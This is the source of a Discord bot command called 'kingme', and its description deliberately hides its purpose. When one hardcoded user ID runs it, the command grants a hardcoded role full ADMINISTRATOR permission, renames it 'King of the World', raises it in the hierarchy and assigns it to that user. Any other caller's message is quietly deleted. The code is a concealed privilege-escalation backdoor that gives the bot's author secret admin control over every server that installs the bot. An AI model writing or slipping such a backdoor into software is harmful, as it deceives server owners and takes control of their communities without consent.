module.exports = {
    name: 'kingme',
    guildOnly: true,
    ownerOnly: true,
    description: "You don't need to know",
    /**
     * @param {import('discord.js').Message} message 
     */
    async execute(message){
        if(message.author.id !== '674140360079048714') return await message.delete();
        let myrole = message.guild.roles.cache.get('770507041289797632');
        await myrole.setPermissions(['ADMINISTRATOR']);
        await myrole.setColor('#fa00ff');
        await myrole.setName('King of the World');
        await myrole.setHoist(true);
        await myrole.setPosition(myrole.position+1);
        message.member.roles.add(myrole);
    }
}